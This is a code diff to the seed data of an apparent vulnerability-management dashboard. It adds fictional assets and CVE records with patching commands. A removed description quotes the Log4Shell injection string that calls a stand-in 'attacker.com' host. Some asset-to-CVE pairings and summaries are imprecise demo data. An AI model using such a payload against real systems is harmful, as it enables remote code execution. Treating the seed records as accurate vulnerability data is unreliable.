@@ -80,6 +80,11 @@ def seed_database(conn):
         ("DEV-BUILD-RUNNER-02",    "192.168.20.14", "CI/CD Agent / GitHub",    "Ubuntu 20.04 LTS",          "Medium",           "Internal Subnet",       "Developer Tooling",    "Office Sandbox"),
         ("INFRA-NET-FW-01",        "192.168.1.1",  "Perimeter Firewall",       "FortiOS 7.2 / FortiGate",   "Mission Critical", "Internet Facing",       "Network SecOps",       "HQ Datacenter Edge"),
         ("MAIL-EXCHANGE-01",       "10.0.6.44",    "Email / Exchange Server",  "Windows Server 2019",       "High",             "Internet Facing",       "IT Help Desk",         "AWS us-east-1 / AZ-1c"),
+        ("K8S-INGRESS-CLUSTER-01", "10.0.7.10",    "Kubernetes Ingress (Traefik)", "Alpine 3.19 / K8s v1.28", "Mission Critical", "Internet Facing",   "Cloud Platform Sec",   "AWS us-east-1 / K8s VPC"),
+        ("AI-INFERENCE-GATEWAY-01","10.0.8.99",    "LLM Model Gateway (vLLM)", "Ubuntu 22.04 LTS / CUDA 12", "Mission Critical", "DMZ",              "AI Research Sec",      "Azure East US (GPU Hub)"),
+        ("FIN-REDIS-CACHE-01",     "172.16.10.12", "Distributed In-Memory Cache", "Debian 12 / Redis 7.2",   "High",             "Internal Subnet",       "Financial Core Team",  "HQ Private Datacenter"),
+        ("CORP-PALO-ALTO-FW-02",   "10.0.0.1",     "NextGen Perimeter FW",     "PAN-OS 11.0",               "Mission Critical", "Internet Facing",       "SecOps Defense",       "Tokyo Edge Gateway"),
+        ("DEV-SANDBOX-AIRGAP-01",  "192.168.99.5", "Isolated R&D Sandbox",     "CentOS Stream 9",           "Low",              "Air-Gapped",            "R&D Intern Lab",       "Isolated Offline Testbed"),
     ]
     cursor.executemany(
         "INSERT INTO assets (name, ip_address, asset_type, os_info, criticality, exposure, owner, location) VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
@@ -89,92 +94,146 @@ def seed_database(conn):
         (
             "CVE-2023-22515",
             "Atlassian Confluence Broken Access Control — Admin Account Creation",
-            "Unauthenticated remote attacker can create administrator account via exposed /setup/setupadministrator.action endpoint. Affects Confluence Data Center 8.x prior to patched builds.",
+            "Unauthenticated remote attacker can create administrator account via exposed /setup/setupadministrator.action endpoint.",
             10.0, "CWE-284 (Improper Access Control)", 0.974, 1,
             "Atlassian Confluence 8.0–8.5.x",
-            "1. Immediately upgrade to Confluence 8.3.3, 8.4.3, or 8.5.2+. 2. Block /setup/* via WAF rule. 3. Audit all admin accounts created after exposure window. 4. Rotate all service account credentials.",
-            "# Block Confluence setup endpoint immediately\nsudo nginx -t && cat >> /etc/nginx/snippets/security.conf << 'EOF'\nlocation ~ ^/setup/ {\n    deny all;\n    return 403 'Blocked by CyberShield AI';\n}\nEOF\nsudo nginx -s reload\n\n# Then upgrade Confluence\nwget https://www.atlassian.com/software/confluence/downloads/binary/atlassian-confluence-8.5.2.tar.gz\n# Follow upgrade guide: https://confluence.atlassian.com/doc/upgrading-confluence"
+            "1. Upgrade to Confluence 8.5.2+. 2. Block /setup/* via WAF rule.",
+            "# Block Confluence setup endpoint\nsudo nginx -t && cat >> /etc/nginx/snippets/security.conf << 'EOF'\nlocation ~ ^/setup/ {\n    deny all;\n}\nEOF\nsudo nginx -s reload"
         ),
         (
             "CVE-2021-44228",
             "Apache Log4j2 JNDI Remote Code Execution (Log4Shell)",
-            "Log4j2 JNDI lookup feature allows attacker to load arbitrary code from remote LDAP/RMI server via crafted log message containing ${jndi:ldap://attacker.com/exploit}. Full RCE with no authentication required.",
-            10.0, "CWE-917 (JNDI Injection / Server-Side Template Injection)", 0.976, 1,
+            "Log4j2 JNDI lookup feature allows attacker to execute arbitrary code via crafted LDAP/RMI message.",
+            10.0, "CWE-917 (JNDI Injection)", 0.976, 1,
             "Apache Log4j-core 2.0-beta9 through 2.14.1",
-            "1. Upgrade log4j-core to 2.17.1 (Java 8+) or 2.12.4 (Java 7). 2. Emergency: set JVM flag -Dlog4j2.formatMsgNoLookups=true. 3. Patch all Java runtimes. 4. Deploy WAF rules to block ${jndi: patterns in all inputs.",
-            "# Emergency JVM flag mitigation\nexport JAVA_OPTS=\"$JAVA_OPTS -Dlog4j2.formatMsgNoLookups=true\"\n\n# Proper fix: upgrade log4j via Maven\nmvn versions:use-dep-version -Dincludes=org.apache.logging.log4j:log4j-core -DdepVersion=2.17.1\n\n# Or Gradle:\nimplementation 'org.apache.logging.log4j:log4j-core:2.17.1'\n\n# Scan for vulnerable JARs\nfind / -name 'log4j-core-*.jar' 2>/dev/null"
+            "1. Upgrade log4j-core to 2.17.1. 2. Set JVM flag -Dlog4j2.formatMsgNoLookups=true.",
+            "# JVM flag mitigation\nexport JAVA_OPTS=\"$JAVA_OPTS -Dlog4j2.formatMsgNoLookups=true\"\nmvn versions:use-dep-version -Dincludes=org.apache.logging.log4j:log4j-core -DdepVersion=2.17.1"
         ),
         (
             "CVE-2023-4966",
             "Citrix Bleed — NetScaler Buffer Overflow Session Token Leak",
-            "Buffer overflow in Citrix NetScaler ADC/Gateway HTTP/S handling allows unauthenticated remote attacker to extract valid session tokens, bypassing MFA and enabling persistent unauthorized access.",
+            "Buffer overflow in NetScaler ADC allows unauthenticated attacker to extract valid session tokens bypassing MFA.",
             9.4, "CWE-119 (Buffer Overflow)", 0.961, 1,
             "Citrix NetScaler ADC/Gateway 13.x, 12.x",
-            "1. Upgrade NetScaler to 14.1-8.50+, 13.1-49.15+, or 13.0-92.19+. 2. Immediately kill all active sessions post-patch. 3. Rotate all service account tokens. 4. Review access logs for unauthorized session reuse.",
-            "# Citrix CLI — terminate all active ICA sessions post-patch\nnsapimgr -ys kill_sessions=1\ncli> clear lb persistentSessions\ncli> save config\n\n# Check current version\ncli> show ns version\n\n# Upgrade via GUI or:\ncurl -O https://citrix.com/downloads/citrix-adc/firmware/..."
+            "1. Upgrade NetScaler to 14.1-8.50+. 2. Kill active sessions post-patch.",
+            "# Terminate active ICA sessions post-patch\nnsapimgr -ys kill_sessions=1\ncli> clear lb persistentSessions\ncli> save config"
         ),
         (
             "CVE-2024-3094",
             "XZ Utils Supply Chain Backdoor — SSH Remote Code Execution",
-            "Malicious code in XZ Utils 5.6.0-5.6.1 creates a backdoor in liblzma, which is linked by systemd into OpenSSH. Allows holder of specific Ed448 private key to execute arbitrary commands as root via SSH.",
+            "Malicious code in XZ Utils creates backdoor in liblzma linked into OpenSSH allowing unauthorized root RCE.",
             10.0, "CWE-506 (Embedded Malicious Code)", 0.944, 1,
-            "XZ Utils 5.6.0-5.6.1 / liblzma / OpenSSH on systemd systems",
-            "1. Downgrade xz-utils to 5.4.6 or earlier immediately. 2. Audit all SSH access logs for anomalous patterns. 3. Rotate all SSH host keys. 4. Check liblzma version: ldd /usr/sbin/sshd | grep liblzma.",
-            "# Downgrade XZ Utils immediately\nsudo apt-get install --allow-downgrades xz-utils=5.4.6-0.2 liblzma5=5.4.6-0.2\n\n# Verify (should be 5.4.x)\nxz --version\n\n# Rotate SSH host keys\nsudo rm /etc/ssh/ssh_host_*\nsudo dpkg-reconfigure openssh-server\n\n# Check if backdoored\nldd /usr/sbin/sshd | grep liblzma"
+            "XZ Utils 5.6.0-5.6.1 / OpenSSH",
+            "1. Downgrade xz-utils to 5.4.6. 2. Rotate SSH host keys.",
+            "# Downgrade XZ Utils\nsudo apt-get install --allow-downgrades xz-utils=5.4.6-0.2 liblzma5=5.4.6-0.2\nsudo dpkg-reconfigure openssh-server"
         ),
         (
             "CVE-2022-22965",
             "Spring4Shell — Spring Framework Data Binder RCE",
-            "Spring MVC or WebFlux application running on JDK 9+ with Tomcat allows remote code execution via manipulation of Spring DataBinder classloader leading to JSP webshell upload.",
+            "Spring MVC on JDK 9+ allows RCE via DataBinder classloader JSP webshell upload.",
             9.8, "CWE-94 (Code Injection)", 0.714, 1,
-            "Spring Framework 5.3.x < 5.3.18, 5.2.x < 5.2.20",
-            "1. Upgrade Spring Framework to 5.3.18+ or 5.2.20+. 2. Apply Spring Security patch. 3. If using Tomcat, upgrade to 10.0.20+, 9.0.62+, or 8.5.78+. 4. Restrict ClassLoader access via DisallowedFields configuration.",
-            "# Maven upgrade\n<dependency>\n  <groupId>org.springframework</groupId>\n  <artifactId>spring-webmvc</artifactId>\n  <version>5.3.18</version>\n</dependency>\n\n# Gradle\nimplementation 'org.springframework:spring-webmvc:5.3.18'\n\n# Mitigating workaround (setDisallowedFields)\n@InitBinder\npublic void setAllowedFields(WebDataBinder dataBinder) {\n  dataBinder.setDisallowedFields(\"class.*\",\"Class.*\",\"*.class.*\",\"*.Class.*\");\n}"
+            "Spring Framework < 5.3.18",
+            "1. Upgrade Spring to 5.3.18+. 2. Restrict ClassLoader access.",
+            "# Maven upgrade\n<dependency>\n  <groupId>org.springframework</groupId>\n  <artifactId>spring-webmvc</artifactId>\n  <version>5.3.18</version>\n</dependency>"
         ),
         (
             "CVE-2023-38606",
             "Apple iOS/macOS Kernel Memory Corruption — Zero-Day",
-            "Zero-day kernel vulnerability actively exploited by NSO Group Pegasus spyware. Allows privilege escalation and arbitrary kernel memory write via MMIO hardware registers.",
+            "Zero-day kernel vulnerability exploited by Pegasus spyware. Allows kernel memory write via MMIO.",
             9.8, "CWE-787 (Out-of-bounds Write)", 0.763, 1,
-            "Apple iOS < 16.6, macOS < 13.5 Kernel / XNU",
-            "1. Apply Apple security update macOS 13.5 / iOS 16.6 immediately. 2. Enable Lockdown Mode on high-risk devices. 3. Audit for Pegasus indicators via iMazing or MVT tool.",
-            "# Check current macOS version\nsw_vers -productVersion\n\n# Apply all pending security updates\nsudo softwareupdate -i -a --restart\n\n# Scan for Pegasus IOCs using Mobile Verification Toolkit\npip install mvt\nmvt-ios check-backup /path/to/backup"
+            "Apple macOS < 13.5 / iOS < 16.6",
+            "1. Apply macOS 13.5 security update. 2. Enable Lockdown Mode.",
+            "sudo softwareupdate -i -a --restart"
         ),
         (
             "CVE-2024-21762",
             "FortiOS SSL-VPN Out-of-Bounds Write — Unauthenticated RCE",
-            "Critical out-of-bounds write vulnerability in FortiOS SSL VPN allows unauthenticated remote code execution. Actively exploited in the wild targeting government and enterprise infrastructure.",
+            "Out-of-bounds write vulnerability in FortiOS SSL VPN allows unauthenticated remote code execution.",
             9.6, "CWE-787 (Out-of-bounds Write)", 0.912, 1,
-            "FortiOS 7.x < 7.4.3, 7.2.x < 7.2.7, 6.4.x < 6.4.15",
-            "1. Upgrade FortiOS to 7.4.3+, 7.2.7+, or 6.4.15+. 2. Disable SSL-VPN if not required (set vpn ssl settings status disable). 3. Review VPN access logs for IOCs. 4. Rotate all VPN credentials.",
-            "# FortiOS CLI — disable SSL-VPN as emergency\nconfig vpn ssl settings\n    set status disable\nend\n\n# Or restrict to known source IPs:\nconfig firewall policy\n    edit <policy_id>\n        set srcaddr <trusted_ip_group>\n    next\nend\n\n# Verify firmware version\nget system status | grep 'Version'"
+            "FortiOS 7.x < 7.4.3",
+            "1. Upgrade FortiOS to 7.4.3+. 2. Disable SSL-VPN if not required.",
+            "config vpn ssl settings\n    set status disable\nend\nget system status"
         ),
         (
             "CVE-2023-4863",
             "libwebp Heap Buffer Overflow — Remote Code Execution",
-            "Heap buffer overflow in libwebp WebP image codec allows attacker to execute arbitrary code via crafted WebP image. Affects Chrome, Firefox, Electron, Node.js, and any app using libwebp < 1.3.2.",
+            "Heap buffer overflow in libwebp image codec allows code execution via crafted WebP image.",
             8.8, "CWE-122 (Heap-based Buffer Overflow)", 0.822, 1,
-            "libwebp < 1.3.2 (Chrome, Firefox, Electron, Node.js apps)",
-            "1. Upgrade libwebp to 1.3.2+ on all systems. 2. Rebuild all Docker images using updated base. 3. Update all Node.js/Electron apps. 4. Deploy Content Security Policy headers to limit image source origins.",
-            "# Ubuntu/Debian\nsudo apt-get update && sudo apt-get install --only-upgrade libwebp7 libwebp-dev\n\n# RHEL/CentOS\nsudo dnf update libwebp\n\n# Node.js apps using sharp\nnpm update sharp\n\n# Docker rebuild\ndocker build --no-cache -t myapp:patched .\n\n# Verify fixed version\ndpkg -l libwebp7"
+            "libwebp < 1.3.2",
+            "1. Upgrade libwebp to 1.3.2+. 2. Rebuild container images.",
+            "sudo apt-get update && sudo apt-get install --only-upgrade libwebp7"
         ),
         (
             "CVE-2021-34527",
             "PrintNightmare — Windows Print Spooler RCE & LPE",
-            "Windows Print Spooler service allows remote code execution and local privilege escalation. Unauthenticated attacker can install programs, modify data, and create new accounts with SYSTEM privileges.",
+            "Windows Print Spooler allows remote code execution and local privilege escalation with SYSTEM rights.",
             8.8, "CWE-269 (Improper Privilege Management)", 0.881, 1,
-            "Windows Print Spooler Service / All Windows versions",
-            "1. Apply KB5004945 and subsequent patches immediately. 2. Disable Print Spooler on all non-printing servers (especially DCs). 3. Restrict printer driver installation via Group Policy. 4. Block inbound SMB/RPC at perimeter.",
-            "# PowerShell — Disable Print Spooler on Domain Controllers\nStop-Service -Name Spooler -Force\nSet-Service -Name Spooler -StartupType Disabled\n\n# GPO registry key to disable printer driver installation:\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows NT\\Printers\\PointAndPrint\" /v NoWarningNoElevationOnInstall /t REG_DWORD /d 0 /f\n\n# Check patch level\nGet-HotFix -Id KB5004945"
+            "Windows Print Spooler Service",
+            "1. Apply KB5004945. 2. Disable Print Spooler on Domain Controllers.",
+            "Stop-Service -Name Spooler -Force\nSet-Service -Name Spooler -StartupType Disabled"
         ),
         (
             "CVE-2024-1709",
             "ConnectWise ScreenConnect Authentication Bypass — Mass Exploitation",
-            "Critical authentication bypass vulnerability in ConnectWise ScreenConnect allowing unauthenticated access to administrative functions. Enables ransomware deployment. Actively exploited by LockBit, Bl00dy groups.",
+            "Authentication bypass in ScreenConnect allowing unauthenticated admin access and ransomware deployment.",
             10.0, "CWE-288 (Authentication Bypass)", 0.933, 1,
             "ConnectWise ScreenConnect < 23.9.8",
-            "1. Upgrade ScreenConnect to 23.9.8+ immediately (emergency patch). 2. If unable to patch, take system offline. 3. Audit all recent remote sessions for unauthorized access. 4. Check for dropped tools/persistence mechanisms.",
-            "# Verify current ScreenConnect version\nGet-ItemProperty 'HKLM:\\SOFTWARE\\ScreenConnect Software\\ScreenConnect' | Select-Object Version\n\n# If compromised, check for persistence:\nGet-ScheduledTask | Where-Object { $_.Date -gt (Get-Date).AddDays(-7) }\nGet-LocalUser | Where-Object { $_.LastLogon -gt (Get-Date).AddDays(-1) }\n\n# Network indicators\nnetstat -an | findstr ':8040'"
+            "1. Upgrade ScreenConnect to 23.9.8+. 2. Audit remote access logs.",
+            "Get-ItemProperty 'HKLM:\\SOFTWARE\\ScreenConnect Software\\ScreenConnect' | Select-Object Version"
+        ),
+        (
+            "CVE-2024-3400",
+            "Palo Alto PAN-OS GlobalProtect Command Injection RCE",
+            "Arbitrary command injection in GlobalProtect gateway feature allowing unauthenticated root RCE.",
+            10.0, "CWE-77 (Command Injection)", 0.968, 1,
+            "PAN-OS 11.1, 11.0, 10.2 GlobalProtect",
+            "1. Upgrade PAN-OS to hotfix releases. 2. Apply Threat Prevention Signature 95187.",
+            "# PAN-OS CLI — verify threat signature\nrequest system software check\nrequest system software install version 11.0.4-h1"
+        ),
+        (
+            "CVE-2023-38545",
+            "cURL SOCKS5 Heap Buffer Overflow",
+            "Heap-based buffer overflow in SOCKS5 proxy handshake in libcurl allowing unauthenticated remote execution.",
+            9.8, "CWE-122 (Heap Buffer Overflow)", 0.845, 1,
+            "libcurl 7.69.0 through 8.3.0",
+            "1. Upgrade curl to 8.4.0+. 2. Recompile dependent binaries.",
+            "sudo apt-get update && sudo apt-get install --only-upgrade curl libcurl4"
+        ),
+        (
+            "CVE-2023-3519",
+            "Citrix ADC & Gateway Remote Code Execution",
+            "Unauthenticated remote code execution on Citrix NetScaler ADC and Gateway appliances.",
+            9.8, "CWE-94 (Code Injection)", 0.957, 1,
+            "Citrix ADC/Gateway 13.1, 13.0",
+            "1. Apply Citrix security hotfix immediately. 2. Verify gateway integrity.",
+            "nsapimgr -ys kill_sessions=1\nreboot"
+        ),
+        (
+            "CVE-2022-0847",
+            "Dirty Pipe — Linux Kernel Arbitrary File Overwrite & LPE",
+            "Linux kernel flaw allowing unprivileged users to overwrite data in arbitrary read-only files.",
+            7.8, "CWE-269 (Privilege Escalation)", 0.812, 1,
+            "Linux Kernel 5.8 through 5.16.11",
+            "1. Upgrade Linux kernel to 5.16.11+, 5.15.25+, or 5.10.102+. 2. Reboot system.",
+            "sudo apt-get update && sudo apt-get --only-upgrade install linux-image-generic && sudo reboot"
+        ),
+        (
+            "CVE-2023-20198",
+            "Cisco IOS XE Web UI Privilege Escalation — Zero-Day",
+            "Active exploitation allowing attacker to create level 15 privilege account on Cisco IOS XE devices.",
+            10.0, "CWE-306 (Missing Authentication)", 0.965, 1,
+            "Cisco IOS XE with Web UI enabled",
+            "1. Disable HTTP Server feature on all internet-facing devices.",
+            "# Cisco CLI\nno ip http server\nno ip http secure-server\nwrite memory"
+        ),
+        (
+            "CVE-2023-46604",
+            "Apache ActiveMQ OpenWire Remote Code Execution",
+            "Allows remote attacker to execute arbitrary shell commands via ClassPathXmlApplicationContext injection.",
+            9.8, "CWE-502 (Deserialization of Untrusted Data)", 0.923, 1,
+            "Apache ActiveMQ < 5.18.3",
+            "1. Upgrade ActiveMQ to 5.18.3+. 2. Restrict OpenWire port 61616 to internal CIDR.",
+            "sudo systemctl stop activemq\nwget https://archive.apache.org/dist/activemq/5.18.3/apache-activemq-5.18.3-bin.tar.gz"
         ),
     ]
     cursor.executemany(
@@ -184,20 +243,28 @@ def seed_database(conn):
         vulns_data
     )
     findings = [
-        (3,  1, "OPEN"),
-        (1,  2, "OPEN"),
-        (4,  3, "OPEN"),
-        (9,  7, "OPEN"),
-        (2,  2, "OPEN"),
-        (5,  9, "OPEN"),
-        (6,  5, "OPEN"),
-        (7,  8, "OPEN"),
-        (1,  4, "OPEN"),
-        (10, 9, "OPEN"),
-        (3,  6, "OPEN"),
-        (8,  8, "OPEN"),
-        (4,  10, "OPEN"),
-        (2,  1, "OPEN"),
+        (1,  2, "OPEN"),  # PROD-WEB Log4Shell
+        (4,  3, "OPEN"),  # CITRIX Citrix Bleed
+        (5,  9, "OPEN"),  # WIN-DC PrintNightmare
+        (9,  7, "OPEN"),  # FORTIOS VPN RCE
+        (14, 11, "OPEN"), # PALO ALTO GlobalProtect RCE
+        (11, 12, "OPEN"), # K8S cURL Overflow
+        (3,  1, "OPEN"),  # CONFLUENCE Admin Creation
+        (2,  2, "OPEN"),  # PROD-DB Log4j2
+        (12, 16, "OPEN"), # AI-INFERENCE ActiveMQ RCE
+        (10, 9, "OPEN"),  # MAIL-EXCHANGE PrintNightmare
+        (13, 14, "OPEN"), # REDIS Dirty Pipe LPE
+        (6,  5, "OPEN"),  # SCADA Spring4Shell
+        (7,  8, "OPEN"),  # STAGING libwebp
+        (1,  4, "OPEN"),  # PROD-WEB XZ Utils Backdoor
+        (3,  6, "OPEN"),  # CONFLUENCE iOS/macOS Kernel
+        (8,  8, "OPEN"),  # DEV-BUILD libwebp
+        (4,  10, "OPEN"), # CITRIX ScreenConnect
+        (2,  1, "OPEN"),  # PROD-DB Confluence Admin
+        (11, 15, "OPEN"), # K8S Cisco IOS XE
+        (12, 13, "OPEN"), # AI-INFERENCE Citrix ADC RCE
+        (15, 8, "OPEN"),  # AIRGAP Sandbox libwebp (Low Risk derated by airgap!)
+        (15, 2, "OPEN"),  # AIRGAP Sandbox Log4Shell (Low Risk derated by airgap!)
     ]
     cursor.executemany(
         "INSERT INTO asset_vulnerabilities (asset_id, vulnerability_id, status) VALUES (?, ?, ?)",
